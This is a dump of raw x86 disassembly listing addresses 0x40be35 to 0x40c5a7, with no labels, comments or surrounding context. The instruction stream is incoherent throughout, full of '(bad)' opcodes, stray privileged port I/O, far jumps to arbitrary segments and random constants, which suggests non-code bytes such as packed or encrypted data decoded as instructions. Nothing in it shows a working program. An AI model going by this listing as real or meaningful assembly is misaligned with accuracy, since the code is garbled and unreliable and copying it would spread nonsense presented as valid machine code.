  40be35:	stc    
  40be36:	outs   dx,BYTE PTR ds:[esi]
  40be37:	jg     0x40bdea
  40be39:	jl     0x40bdc1
  40be3b:	repz arpl WORD PTR [edi-0x7e],ax
  40be3f:	ja     0x40bdee
  40be41:	shl    DWORD PTR [edi+0x78],1
  40be44:	fbstp  TBYTE PTR [esi+edx*8+0x5e18e907]
  40be4b:	lahf   
  40be4c:	push   si
  40be4e:	jp     0x40beb3
  40be50:	daa    
  40be51:	mov    edi,0xaad02d3f
  40be56:	sub    DWORD PTR [esi-0x49],edi
  40be59:	scas   al,BYTE PTR es:[edi]
  40be5a:	lds    edi,FWORD PTR [esp+ebx*1+0x125d5c4e]
  40be61:	popf   
  40be62:	lods   al,BYTE PTR ds:[esi]
  40be63:	popf   
  40be64:	enter  0x5e9b,0x96
  40be68:	idiv   BYTE PTR [ebp+0x19a5af8c]
  40be6e:	inc    ebx
  40be6f:	and    edx,DWORD PTR [eax-0x612cba12]
  40be75:	add    edi,edi
  40be77:	aas    
  40be78:	dec    ecx
  40be79:	mov    ebp,0x36e56cbc
  40be7e:	push   ds
  40be7f:	div    BYTE PTR [ebp-0x71]
  40be82:	adc    esi,ebp
  40be84:	push   esi
  40be85:	jns    0x40bee3
  40be87:	retf   
  40be88:	add    BYTE PTR [edi],dh
  40be8a:	inc    edi
  40be8b:	jne    0x40be19
  40be8d:	into   
  40be8e:	dec    ax
  40be90:	cmp    eax,0x6562cc86
  40be95:	sti    
  40be96:	scas   eax,DWORD PTR es:[edi]
  40be97:	(bad)  
  40be98:	xchg   ecx,eax
  40be99:	and    al,0x3a
  40be9b:	mov    al,0x2e
  40be9d:	or     edi,esi
  40be9f:	js     0x40beb1
  40bea1:	lds    esi,FWORD PTR [eax]
  40bea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bea5:	sbb    edi,DWORD PTR [edx+0x69c7f51d]
  40beab:	fisub  DWORD PTR [edi-0x52e83750]
  40beb1:	xchg   ebp,eax
  40beb2:	inc    ax
  40beb4:	imul   esi,DWORD PTR cs:[edx],0x162f29d1
  40bebb:	jmp    0x5ab0dd23
  40bec0:	jp     0x40be9a
  40bec2:	mov    BYTE PTR [ebx],bl
  40bec4:	or     ecx,ecx
  40bec6:	scas   al,BYTE PTR es:[edi]
  40bec7:	push   esi
  40bec8:	mov    DWORD PTR [ebx],0x2adf6e41
  40bece:	adc    esp,DWORD PTR [edi-0x82a942b]
  40bed4:	or     DWORD PTR [edi+0x736d4479],ebp
  40beda:	sti    
  40bedb:	stos   DWORD PTR es:[edi],eax
  40bedc:	sqrtps xmm6,XMMWORD PTR [ebx]
  40bedf:	dec    esi
  40bee0:	sbb    ch,bl
  40bee2:	popa   
  40bee3:	shl    ecx,cl
  40bee5:	(bad)  
  40bee6:	fcomp  QWORD PTR [eax]
  40bee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bee9:	pusha  
  40beea:	mov    ds:0x46ddcba9,al
  40beef:	cmp    al,0x1e
  40bef1:	in     eax,dx
  40bef2:	add    cl,al
  40bef4:	sbb    ecx,DWORD PTR ds:0x509cb363
  40befa:	xor    eax,0xd183d155
  40beff:	in     al,0x59
  40bf01:	fist   WORD PTR [ebx-0x44e83cbf]
  40bf07:	cli    
  40bf08:	ins    DWORD PTR es:[edi],dx
  40bf09:	lea    edx,[ebp+0x5]
  40bf0c:	icebp  
  40bf0d:	push   ecx
  40bf0e:	cdq    
  40bf0f:	addr16 xchg edi,eax
  40bf11:	test   BYTE PTR [eax-0x5d881334],al
  40bf17:	nop
  40bf18:	xor    al,0x31
  40bf1a:	ret    0x2fd
  40bf1d:	pushf  
  40bf1e:	xchg   edi,eax
  40bf1f:	repnz fs adc ch,ah
  40bf23:	mov    dh,cl
  40bf25:	jb     0x40bed6
  40bf27:	mov    edi,0x5bc277a
  40bf2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf2d:	xlat   BYTE PTR ds:[ebx]
  40bf2e:	ret    0x9264
  40bf31:	jns    0x40bf64
  40bf33:	test   DWORD PTR cs:[ecx+0x58d877de],0xbbc777e6
  40bf3e:	cdq    
  40bf3f:	push   ebp
  40bf40:	stos   DWORD PTR es:[edi],eax
  40bf41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf42:	cwde   
  40bf43:	pushf  
  40bf44:	push   0x91e3f980
  40bf49:	or     ah,BYTE PTR [edi-0xef41fad]
  40bf4f:	jmp    0x4ebf:0x94bea078
  40bf56:	jbe    0x40bf01
  40bf58:	and    ebp,DWORD PTR [edi+0x4206d240]
  40bf5e:	imul   edx,eax,0x4b99f2f9
  40bf64:	push   0xffffff8d
  40bf66:	push   ss
  40bf67:	mov    ss,WORD PTR [esi+0x1e28d65d]
  40bf6d:	bound  eax,QWORD PTR [esi]
  40bf6f:	and    eax,0x983098a0
  40bf74:	mov    ds,WORD PTR [eax]
  40bf76:	mov    dh,0x3c
  40bf78:	in     al,0xe
  40bf7a:	jne    0x40bf08
  40bf7c:	sub    dh,BYTE PTR [esi-0x3c]
  40bf7f:	scas   al,BYTE PTR es:[edi]
  40bf80:	popf   
  40bf81:	lock (bad) 
  40bf83:	adc    eax,0xb9159ca3
  40bf88:	clc    
  40bf89:	jp     0x40bfcc
  40bf8b:	xchg   edx,eax
  40bf8c:	(bad)  
  40bf8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf8e:	pop    ebx
  40bf8f:	fld    TBYTE PTR [edx+0x35]
  40bf92:	aad    0x2f
  40bf94:	pop    esi
  40bf95:	fidiv  DWORD PTR [edi]
  40bf97:	or     esi,DWORD PTR [ecx]
  40bf99:	dec    ebp
  40bf9a:	fst    QWORD PTR [ebp-0x49]
  40bf9d:	sbb    bl,dl
  40bf9f:	jb     0x40bf31
  40bfa1:	stos   DWORD PTR es:[edi],eax
  40bfa2:	cmp    dh,BYTE PTR [esi-0x6ffc9b42]
  40bfa8:	js     0x40bf3b
  40bfaa:	sbb    al,0xff
  40bfac:	and    al,0xa2
  40bfae:	xchg   esp,eax
  40bfaf:	sahf   
  40bfb0:	inc    eax
  40bfb1:	test   eax,0x5081286e
  40bfb6:	(bad)  
  40bfb7:	push   ds
  40bfb8:	cmp    al,0xec
  40bfba:	xor    al,0x2b
  40bfbc:	addr16 aaa 
  40bfbe:	jecxz  0x40c01a
  40bfc0:	cs js  0x40bf97
  40bfc3:	cmp    dh,cl
  40bfc5:	mov    ebp,0x3c0781
  40bfca:	mov    eax,ds:0xac973341
  40bfcf:	adc    al,0x6e
  40bfd1:	adc    al,BYTE PTR [ebp-0x4cc891cc]
  40bfd7:	jg     0x40bfdc
  40bfd9:	xchg   esi,eax
  40bfda:	or     BYTE PTR [esi+0xc11e5ea],dh
  40bfe0:	inc    DWORD PTR [esi]
  40bfe2:	sbb    bh,dl
  40bfe4:	iret   
  40bfe5:	push   ebx
  40bfe6:	pop    esi
  40bfe7:	push   ebx
  40bfe8:	enter  0x7eb2,0xb1
  40bfec:	aas    
  40bfed:	cmp    dh,bh
  40bfef:	sbb    esi,edx
  40bff1:	jle    0x40bff0
  40bff3:	(bad)  
  40bff5:	xchg   BYTE PTR [esp+ebx*4-0x616e6646],dh
  40bffc:	mov    ebx,0xf155a38a
  40c001:	pushf  
  40c002:	push   ss
  40c003:	ds jno 0x40bff3
  40c006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c007:	dec    ecx
  40c008:	repnz adc eax,0xdb087fd9
  40c00e:	dec    ebx
  40c00f:	sbb    eax,0x6dd5b25d
  40c014:	pop    es
  40c015:	arpl   WORD PTR [ebx+0x215cb4e],si
  40c01b:	loope  0x40c009
  40c01d:	in     eax,dx
  40c01e:	mov    DWORD PTR [eax],0xad848405
  40c024:	jecxz  0x40c02d
  40c026:	addr16 xchg esi,eax
  40c028:	jge    0x40c08f
  40c02a:	out    0xe8,al
  40c02c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c02d:	or     eax,0xa0a3c3eb
  40c032:	mov    bh,0xee
  40c034:	into   
  40c035:	push   edi
  40c036:	mov    ds:0xb9896bbd,al
  40c03b:	add    eax,0xf0520688
  40c040:	retf   
  40c041:	jo     0x40c049
  40c043:	mov    al,0xd6
  40c045:	imul   esi,eax,0xc41ef18a
  40c04b:	mov    eax,0x33e3a8b6
  40c050:	cdq    
  40c051:	mov    eax,0x86edf042
  40c056:	daa    
  40c057:	lods   eax,DWORD PTR ds:[esi]
  40c058:	xlat   BYTE PTR ds:[ebx]
  40c059:	loope  0x40c0a1
  40c05b:	rcl    BYTE PTR [edi+ecx*4-0x60],cl
  40c05f:	aaa    
  40c060:	mov    ecx,edx
  40c062:	jne    0x40bffa
  40c064:	pop    esi
  40c065:	push   es
  40c066:	sub    DWORD PTR [eax-0x4e],0x23f609b
  40c06d:	jg     0x40c0a9
  40c06f:	paddw  mm2,QWORD PTR [edi-0x24]
  40c073:	loope  0x40c0e6
  40c075:	shl    BYTE PTR [ebp+0x3a7f41d1],1
  40c07b:	jl     0x40c053
  40c07d:	clc    
  40c07e:	shl    BYTE PTR [edi-0x22d50bd5],1
  40c084:	push   edx
  40c085:	rcr    DWORD PTR [ebx+0x72d819ef],cl
  40c08b:	push   ss
  40c08c:	daa    
  40c08d:	mov    al,0x80
  40c08f:	pop    edi
  40c090:	imul   esi,DWORD PTR [eax],0x6f2c1ecb
  40c096:	push   eax
  40c097:	fadd   DWORD PTR [eax-0xbd3a8f0]
  40c09d:	(bad)  
  40c09e:	fiadd  DWORD PTR [edx-0x26d92520]
  40c0a4:	xchg   ebx,eax
  40c0a5:	sbb    ch,BYTE PTR ds:0xdea7f26
  40c0ab:	jp     0x40c070
  40c0ad:	xor    ebx,esp
  40c0af:	inc    edx
  40c0b0:	(bad)  
  40c0b2:	sub    edi,DWORD PTR [edx+0x71]
  40c0b5:	pop    edi
  40c0b6:	sub    al,0x1d
  40c0b8:	aad    0x2d
  40c0ba:	dec    esp
  40c0bb:	add    ecx,DWORD PTR [ecx]
  40c0bd:	sar    edx,1
  40c0bf:	retf   0x716d
  40c0c2:	mov    ch,0xe
  40c0c4:	xor    dl,BYTE PTR [eax-0x1c510bf]
  40c0ca:	fsub   QWORD PTR [esi-0x8]
  40c0cd:	cmc    
  40c0ce:	outs   dx,DWORD PTR ds:[esi]
  40c0cf:	xor    bl,BYTE PTR [ebx]
  40c0d1:	loope  0x40c0f6
  40c0d3:	aam    0x74
  40c0d5:	(bad)  
  40c0d6:	adc    ecx,DWORD PTR [esi-0x34]
  40c0d9:	push   ebp
  40c0da:	xchg   ebx,eax
  40c0db:	scas   al,BYTE PTR es:[edi]
  40c0dc:	push   esp
  40c0dd:	leave  
  40c0de:	mov    es,WORD PTR ds:0x9705a75a
  40c0e4:	and    DWORD PTR [ebp-0x704246f3],ebp
  40c0ea:	sub    esi,DWORD PTR [ecx]
  40c0ec:	in     al,0x43
  40c0ee:	aaa    
  40c0ef:	mov    al,0x94
  40c0f1:	test   DWORD PTR [esi-0x6313089f],edx
  40c0f7:	stos   BYTE PTR es:[edi],al
  40c0f8:	fs into 
  40c0fa:	pop    edx
  40c0fb:	cld    
  40c0fc:	imul   esp,DWORD PTR [esi*2-0xc840922],0xa79ad203
  40c107:	sbb    esi,esi
  40c109:	fist   DWORD PTR [ebx-0xd]
  40c10c:	dec    edx
  40c10d:	mov    ebp,0x7b439351
  40c112:	int3   
  40c113:	setno  BYTE PTR [edi+0x78f99ee8]
  40c11a:	loop   0x40c145
  40c11c:	dec    DWORD PTR [edx-0x69]
  40c11f:	mov    al,ds:0x78bcbf37
  40c124:	ja     0x40c0c3
  40c126:	pop    ds
  40c127:	inc    esp
  40c128:	sub    ah,BYTE PTR [edi]
  40c12a:	arpl   WORD PTR [eax+0x52],ax
  40c12d:	in     al,dx
  40c12e:	xor    eax,0x512ddde
  40c133:	sub    eax,DWORD PTR [edi+0x44c0580a]
  40c139:	xor    eax,0xf0648661
  40c13e:	retf   0xe2d3
  40c141:	sub    ebp,edx
  40c143:	mov    eax,0xdcdd45bd
  40c148:	sahf   
  40c149:	sub    DWORD PTR [ebp-0x17],ebx
  40c14c:	mov    edi,0xb2b68af0
  40c151:	jb     0x40c0fc
  40c153:	dec    edi
  40c154:	cdq    
  40c155:	daa    
  40c156:	inc    ecx
  40c157:	adc    eax,0x8c6203cc
  40c15c:	or     ebx,DWORD PTR [esi+0x39841751]
  40c162:	(bad)  
  40c163:	les    esi,FWORD PTR [esi+0x6]
  40c166:	jb     0x40c1c2
  40c168:	add    DWORD PTR [ecx],edi
  40c16a:	jo     0x40c11e
  40c16c:	push   esp
  40c16d:	je     0x40c125
  40c16f:	pop    esp
  40c170:	xchg   ecx,eax
  40c171:	out    dx,eax
  40c172:	out    0x14,al
  40c174:	in     eax,0xe0
  40c176:	mov    ds:0xabaf5584,eax
  40c17b:	repz cli 
  40c17d:	mov    dh,al
  40c17f:	cmc    
  40c180:	mov    ecx,0x36c89054
  40c185:	and    bh,BYTE PTR [ebx+0x7d]
  40c188:	scas   eax,DWORD PTR es:[edi]
  40c189:	inc    esi
  40c18a:	nop
  40c18b:	pop    es
  40c18c:	out    dx,al
  40c18d:	jl     0x40c1cc
  40c18f:	test   eax,0x62b0f7e9
  40c194:	stos   DWORD PTR es:[edi],eax
  40c195:	inc    ebp
  40c196:	and    eax,0x6e60075e
  40c19b:	or     al,0xc6
  40c19d:	mov    dh,BYTE PTR cs:[eax]
  40c1a0:	leave  
  40c1a1:	mov    ch,0xf6
  40c1a3:	add    ecx,DWORD PTR [ecx]
  40c1a5:	jmp    0x1ade:0x59d917f3
  40c1ac:	(bad)  
  40c1ad:	cld    
  40c1ae:	retf   0x38f0
  40c1b1:	adc    dl,ch
  40c1b3:	xchg   esp,eax
  40c1b4:	(bad)  
  40c1b5:	outs   dx,DWORD PTR ds:[esi]
  40c1b6:	(bad)  
  40c1b7:	jno    0x40c208
  40c1b9:	repz or ebp,ebp
  40c1bc:	pop    es
  40c1bd:	cmc    
  40c1be:	popf   
  40c1bf:	push   eax
  40c1c0:	and    dl,BYTE PTR [edi]
  40c1c2:	(bad)  
  40c1c3:	sbb    ebx,edi
  40c1c5:	out    dx,al
  40c1c6:	add    BYTE PTR ds:0x3b96de5a,0xf5
  40c1cd:	pop    esi
  40c1ce:	mov    esp,0xbdff34b3
  40c1d3:	or     bl,bh
  40c1d5:	xor    DWORD PTR [esp+edi*4],edx
  40c1d8:	cmp    BYTE PTR [edi+edi*8+0x330f8d62],ah
  40c1df:	jg     0x40c192
  40c1e1:	loope  0x40c259
  40c1e3:	(bad)  
  40c1e4:	dec    ebx
  40c1e5:	adc    BYTE PTR [eax+eiz*4],bh
  40c1e8:	inc    esi
  40c1e9:	pop    ecx
  40c1ea:	(bad)  
  40c1eb:	in     al,dx
  40c1ec:	fwait
  40c1ed:	daa    
  40c1ee:	or     al,0x3a
  40c1f0:	mov    ebp,0x37c381b9
  40c1f5:	cmp    DWORD PTR [ebp-0x35967893],edi
  40c1fb:	jle    0x40c1ad
  40c1fd:	and    bh,dh
  40c1ff:	inc    ebx
  40c200:	jno    0x40c1d2
  40c202:	jge    0x40c200
  40c204:	cmp    esi,DWORD PTR [esp+esi*8+0x68]
  40c208:	mov    ds:0x3ecae76b,al
  40c20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c20e:	xor    DWORD PTR [ecx],eax
  40c210:	dec    esi
  40c211:	call   0xd5085633
  40c216:	cmc    
  40c217:	cld    
  40c218:	lahf   
  40c219:	and    eax,0xe4cd9394
  40c21e:	jecxz  0x40c1ea
  40c220:	cs sti 
  40c222:	shl    edi,0xc0
  40c225:	data16 int 0x3a
  40c228:	dec    eax
  40c229:	and    DWORD PTR [ebx],esp
  40c22b:	imul   ebp,DWORD PTR [edx+0x347a80c9],0x6b744400
  40c235:	push   ebx
  40c236:	(bad)  
  40c238:	cmp    edi,DWORD PTR [eax]
  40c23a:	popa   
  40c23b:	in     eax,0x19
  40c23d:	adc    eax,0xbe30599b
  40c242:	jle    0x40c28c
  40c244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c245:	push   ebp
  40c246:	retf   
  40c247:	sti    
  40c248:	jne    0x40c1f4
  40c24a:	push   ss
  40c24b:	mov    bl,0x54
  40c24d:	or     al,0x5
  40c24f:	push   0xffffffc4
  40c251:	fxch   st(5)
  40c253:	test   dl,ch
  40c255:	call   0x95e73c6e
  40c25a:	leave  
  40c25b:	pop    ecx
  40c25c:	push   ds
  40c25d:	(bad)  
  40c25f:	iret   
  40c260:	sbb    DWORD PTR [ebx-0x3c640c81],ecx
  40c266:	test   al,0x57
  40c268:	repz or ah,ah
  40c26b:	jmp    DWORD PTR cs:[ecx]
  40c26e:	sbb    al,0x24
  40c270:	test   BYTE PTR [eax+0x56],0x33
  40c274:	push   ebx
  40c275:	repz shl bl,0x51
  40c279:	or     al,0x12
  40c27b:	pop    es
  40c27c:	add    al,BYTE PTR [edx]
  40c27e:	jmp    0x1f0e0c16
  40c283:	xor    al,ah
  40c285:	sbb    dl,ah
  40c287:	pop    ecx
  40c288:	mov    cl,0x45
  40c28a:	push   0x2d9fcd2
  40c28f:	out    dx,eax
  40c290:	dec    edx
  40c291:	push   es
  40c292:	sub    al,0xda
  40c294:	cwde   
  40c295:	jo     0x40c292
  40c297:	fstp   DWORD PTR [ecx-0xd1236ef]
  40c29d:	(bad)  
  40c29e:	idiv   DWORD PTR [ecx]
  40c2a0:	add    edi,DWORD PTR [ebp-0x24]
  40c2a3:	fimul  WORD PTR [eax+0x3d]
  40c2a6:	push   cs
  40c2a7:	or     BYTE PTR [ebx-0x74],dh
  40c2aa:	inc    ebx
  40c2ab:	sbb    al,0xea
  40c2ad:	fmulp  st(2),st
  40c2af:	repz add ch,BYTE PTR [edi-0x45]
  40c2b3:	lods   al,BYTE PTR ds:[esi]
  40c2b4:	popa   
  40c2b5:	add    al,0xa3
  40c2b7:	stos   DWORD PTR es:[edi],eax
  40c2b8:	test   DWORD PTR [esi],edi
  40c2ba:	mov    esp,0x275706bd
  40c2bf:	dec    ebx
  40c2c0:	ret    0xb85
  40c2c3:	mov    dl,0x36
  40c2c5:	mov    cl,0xc2
  40c2c7:	jb     0x40c2f8
  40c2c9:	xlat   BYTE PTR ds:[ebx]
  40c2ca:	sbb    BYTE PTR [edx-0x3709cee1],dl
  40c2d0:	mov    eax,0xfcaea104
  40c2d5:	test   al,0x9f
  40c2d7:	mov    ds:0x9ce4c33e,eax
  40c2dc:	pop    edi
  40c2dd:	js     0x40c260
  40c2df:	adc    edx,DWORD PTR [eax]
  40c2e1:	sbb    DWORD PTR gs:[eax-0x2da2f9ca],0x1d
  40c2e9:	dec    eax
  40c2ea:	imul   esi,DWORD PTR [edx+0x319553a8],0xffffff80
  40c2f1:	push   edi
  40c2f2:	nop
  40c2f3:	and    ecx,eax
  40c2f5:	sub    eax,0x64d40be5
  40c2fa:	pushf  
  40c2fb:	ins    DWORD PTR es:[edi],dx
  40c2fc:	sub    DWORD PTR [esi-0x46fc1ec7],edx
  40c302:	out    dx,al
  40c303:	push   ss
  40c304:	lods   eax,DWORD PTR ds:[esi]
  40c305:	mov    ebx,gs
  40c307:	icebp  
  40c308:	mov    dl,0xbb
  40c30a:	xlat   BYTE PTR ds:[ebx]
  40c30b:	mov    ch,0xd6
  40c30d:	push   0x29
  40c30f:	dec    eax
  40c310:	push   0x55
  40c312:	rol    BYTE PTR [esi-0x4e25faf],1
  40c318:	pop    edx
  40c319:	xchg   ebp,eax
  40c31a:	ins    BYTE PTR es:[edi],dx
  40c31b:	jp     0x40c2af
  40c31d:	jge    0x40c385
  40c31f:	ficomp WORD PTR ds:0x7ccc002c
  40c325:	cs jbe 0x40c2ab
  40c328:	pop    ecx
  40c329:	iret   
  40c32a:	repnz hlt 
  40c32c:	sbb    DWORD PTR ds:0x94439a32,ebp
  40c332:	aas    
  40c333:	and    eax,0xa9298ab2
  40c338:	arpl   WORD PTR [edx-0xfc95f2b],sp
  40c33e:	mov    ah,0x97
  40c340:	mov    ebp,0x2bcb115b
  40c345:	push   0xfffffffc
  40c347:	xor    eax,0x12a6efd1
  40c34c:	sub    BYTE PTR [ebx],0x55
  40c34f:	and    ebp,ecx
  40c351:	fs (bad) 
  40c353:	stos   DWORD PTR es:[edi],eax
  40c354:	or     ecx,DWORD PTR [edx]
  40c356:	or     eax,DWORD PTR [ecx+0x38]
  40c359:	cmp    al,0x9
  40c35b:	add    esp,edx
  40c35d:	fistp  DWORD PTR [ecx-0x78]
  40c360:	outs   dx,DWORD PTR ds:[esi]
  40c361:	fwait
  40c362:	je     0x40c2ee
  40c364:	or     BYTE PTR [edi-0x4efc12a6],dl
  40c36a:	and    BYTE PTR [edx+0x4c],0x96
  40c36e:	jno    0x40c3e3
  40c370:	ret    
  40c371:	sar    DWORD PTR [eax-0x2cadae8b],0x41
  40c378:	add    eax,0x19494f98
  40c37d:	adc    eax,0x4a23bbb7
  40c382:	dec    ebx
  40c383:	push   ebx
  40c384:	sub    esi,esi
  40c386:	cld    
  40c387:	ffreep st(6)
  40c389:	xlat   BYTE PTR ds:[ebx]
  40c38a:	loope  0x40c364
  40c38c:	pop    eax
  40c38d:	pop    esp
  40c38e:	sub    al,0x54
  40c390:	retf   0xc999
  40c393:	jnp    0x40c31c
  40c395:	pop    ebp
  40c396:	push   ecx
  40c397:	inc    edi
  40c398:	push   0xffffffdc
  40c39a:	retf   0x442f
  40c39d:	pop    esp
  40c39e:	retf   0x8609
  40c3a1:	cmp    al,0x2a
  40c3a3:	(bad)  
  40c3a4:	mov    bl,0x68
  40c3a6:	stc    
  40c3a7:	sbb    ebx,DWORD PTR [ebp-0x6e1c04be]
  40c3ad:	sub    eax,0x3d6e3de2
  40c3b2:	xor    eax,0x66f97f78
  40c3b7:	sub    eax,0x9f545c00
  40c3bc:	sbb    eax,0xb3a5f13d
  40c3c1:	(bad)  
  40c3c2:	das    
  40c3c3:	cli    
  40c3c4:	mov    eax,ds:0xa046792b
  40c3c9:	test   al,0x81
  40c3cb:	cmp    al,0x34
  40c3cd:	out    dx,al
  40c3ce:	xchg   esi,eax
  40c3cf:	pushf  
  40c3d0:	das    
  40c3d1:	into   
  40c3d2:	inc    ebp
  40c3d3:	out    dx,eax
  40c3d4:	je     0x40c40f
  40c3d6:	jns    0x40c3c7
  40c3d8:	imul   esi,DWORD PTR [edx-0x53],0xe0684003
  40c3df:	out    dx,eax
  40c3e0:	mov    ds:0xe76c0409,al
  40c3e5:	lds    edi,FWORD PTR [ecx+0x3f73216c]
  40c3eb:	enter  0xbd76,0xff
  40c3ef:	mov    edi,DWORD PTR [eax-0x78]
  40c3f2:	arpl   WORD PTR [eax+0x24],di
  40c3f5:	xchg   edx,eax
  40c3f6:	pop    edi
  40c3f7:	mov    ebp,0xe5fd0e37
  40c3fc:	and    BYTE PTR [edi+0x11],ah
  40c3ff:	cs sub al,0x57
  40c402:	not    al
  40c404:	loop   0x40c44f
  40c406:	xor    cl,BYTE PTR ds:0xb5918728
  40c40c:	cmp    al,0x7a
  40c40e:	outs   dx,DWORD PTR ds:[esi]
  40c40f:	das    
  40c410:	into   
  40c411:	xor    DWORD PTR [edx-0x3c1972a4],edx
  40c417:	into   
  40c418:	xchg   esi,eax
  40c419:	inc    ecx
  40c41a:	rcr    dl,1
  40c41c:	cld    
  40c41d:	mov    edx,0x508bbb79
  40c422:	std    
  40c423:	sub    DWORD PTR [ecx-0x2fc7c105],edi
  40c429:	jp     0x40c483
  40c42b:	imul   eax,DWORD PTR [esi],0x4f
  40c42e:	sbb    al,0xe5
  40c430:	hlt    
  40c431:	push   ds
  40c432:	sub    edx,DWORD PTR [ebp-0x1277c231]
  40c438:	xor    dh,ch
  40c43a:	mov    ch,0xfe
  40c43c:	push   eax
  40c43d:	and    edx,DWORD PTR [edx]
  40c43f:	push   esp
  40c440:	mov    al,0x22
  40c442:	cmp    ecx,DWORD PTR [edx+0x2f6114c6]
  40c448:	adc    al,0xbb
  40c44a:	add    al,0x88
  40c44c:	in     eax,0x21
  40c44e:	adc    dh,dh
  40c450:	cli    
  40c451:	mov    ecx,0x52e4b9
  40c456:	test   al,0x2e
  40c458:	sub    eax,0x9c0e95c5
  40c45d:	xchg   edx,eax
  40c45e:	repnz pop eax
  40c460:	add    al,0x11
  40c462:	int3   
  40c463:	cmp    eax,esp
  40c465:	stos   DWORD PTR es:[edi],eax
  40c466:	mov    BYTE PTR ds:0x22529239,0x5f
  40c46d:	pop    ebx
  40c46e:	sub    al,0xcf
  40c470:	fsubr  st,st(0)
  40c472:	sti    
  40c473:	xchg   ecx,eax
  40c474:	xchg   DWORD PTR [edx-0x707f40a5],esp
  40c47a:	jbe    0x40c421
  40c47c:	push   esp
  40c47d:	jo     0x40c4c8
  40c47f:	jns    0x40c500
  40c481:	jg     0x40c485
  40c483:	push   ebp
  40c484:	pusha  
  40c485:	leave  
  40c486:	inc    esp
  40c487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c488:	into   
  40c489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c48a:	jnp    0x40c4a2
  40c48c:	addr16 inc eax
  40c48e:	xchg   esi,eax
  40c48f:	ins    DWORD PTR es:[edi],dx
  40c490:	nop
  40c491:	jl     0x40c481
  40c493:	xchg   ebx,eax
  40c494:	xchg   esp,eax
  40c495:	call   0x8a02fefe
  40c49a:	add    DWORD PTR [eax-0x2d],esp
  40c49d:	jg     0x40c474
  40c49f:	mov    ebp,0xb59594e3
  40c4a4:	fbstp  TBYTE PTR [ebx]
  40c4a6:	adc    al,0xf
  40c4a8:	in     al,dx
  40c4a9:	mov    ah,0x29
  40c4ab:	mov    eax,0x14c9bdbc
  40c4b0:	xchg   BYTE PTR [edi],ah
  40c4b2:	sets   dh
  40c4b5:	fwait
  40c4b6:	popf   
  40c4b7:	clc    
  40c4b8:	xor    eax,0x4a796bb4
  40c4bd:	inc    eax
  40c4be:	ins    DWORD PTR es:[edi],dx
  40c4bf:	aam    0xf3
  40c4c1:	pop    esp
  40c4c2:	mov    bh,0x3f
  40c4c4:	mov    edi,0xf8bac432
  40c4c9:	ins    BYTE PTR es:[edi],dx
  40c4ca:	call   0xfc0d3fd4
  40c4cf:	outs   dx,BYTE PTR ds:[esi]
  40c4d0:	lods   eax,DWORD PTR ds:[esi]
  40c4d1:	fcomp  QWORD PTR [ebp-0x5c003ca3]
  40c4d7:	adc    edx,DWORD PTR ds:0xa847180d
  40c4dd:	outs   dx,BYTE PTR ds:[esi]
  40c4de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4df:	clc    
  40c4e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4e1:	daa    
  40c4e2:	out    dx,eax
  40c4e3:	imul   edx,DWORD PTR [eax],0xf01a80c9
  40c4e9:	out    0xca,al
  40c4eb:	test   al,0x16
  40c4ed:	cmc    
  40c4ee:	pop    es
  40c4ef:	sbb    eax,0xc4ed3011
  40c4f4:	mov    ds:0x9d1e267,eax
  40c4f9:	scas   eax,DWORD PTR es:[edi]
  40c4fa:	dec    esp
  40c4fb:	enter  0x3af9,0x92
  40c4ff:	fidivr WORD PTR [edx]
  40c501:	js     0x40c484
  40c503:	adc    eax,0x4d69b3a3
  40c508:	push   esp
  40c509:	jecxz  0x40c4b4
  40c50b:	inc    esi
  40c50c:	daa    
  40c50d:	pop    ebp
  40c50e:	idiv   DWORD PTR [esi+ecx*4]
  40c511:	jmp    0xfeda:0x39d3af2f
  40c518:	lahf   
  40c519:	cwde   
  40c51a:	jae    0x40c531
  40c51c:	ffree  st(6)
  40c51e:	mov    ebp,0x3d7bb28a
  40c523:	adc    edx,edx
  40c525:	mov    eax,0xecade71a
  40c52a:	pop    esi
  40c52b:	pop    ss
  40c52c:	pop    es
  40c52d:	in     al,0xf0
  40c52f:	mov    edx,0x8b2fb9ad
  40c534:	jb     0x40c501
  40c536:	push   edx
  40c537:	mov    esi,0x9459912e
  40c53c:	(bad)  
  40c53e:	jbe    0x40c56e
  40c540:	mov    WORD PTR ds:0x71573ac7,dx
  40c547:	mov    ds:0xe78cdf6f,eax
  40c54c:	icebp  
  40c54d:	mov    ds:0xb72147af,al
  40c552:	cmp    al,0xf0
  40c554:	mov    eax,0xc58b6f28
  40c559:	ins    DWORD PTR es:[edi],dx
  40c55a:	add    ebp,DWORD PTR [eax]
  40c55c:	cmp    bh,dl
  40c55e:	xorps  xmm6,XMMWORD PTR [ebp+0x24424a9e]
  40c565:	mov    bl,0xaf
  40c567:	push   esi
  40c568:	mov    cl,0x6d
  40c56a:	dec    eax
  40c56b:	repnz lock shr BYTE PTR [esi+edx*4],0x3d
  40c571:	loop   0x40c594
  40c573:	dec    ecx
  40c574:	xchg   ebp,eax
  40c575:	adc    DWORD PTR [esi],eax
  40c577:	inc    esi
  40c578:	ret    
  40c579:	mov    DWORD PTR [esi-0x29f8c23b],esi
  40c57f:	icebp  
  40c580:	jmp    0x40c5ac
  40c582:	enter  0xbdb5,0x5c
  40c586:	inc    edx
  40c587:	sub    ebp,DWORD PTR [edi+ecx*4-0x41369277]
  40c58e:	outs   dx,DWORD PTR ds:[esi]
  40c58f:	jno    0x40c5cc
  40c591:	push   edi
  40c592:	stos   DWORD PTR es:[edi],eax
  40c593:	push   eax
  40c594:	mov    ebp,0x7696ebe3
  40c599:	icebp  
  40c59a:	xor    BYTE PTR [edi-0x29620ce4],ah
  40c5a0:	sbb    BYTE PTR [ecx-0x54],dh
  40c5a3:	jl     0x40c602
  40c5a5:	jnp    0x40c532
  40c5a7:	scas   eax,DWORD PTR es:[edi]
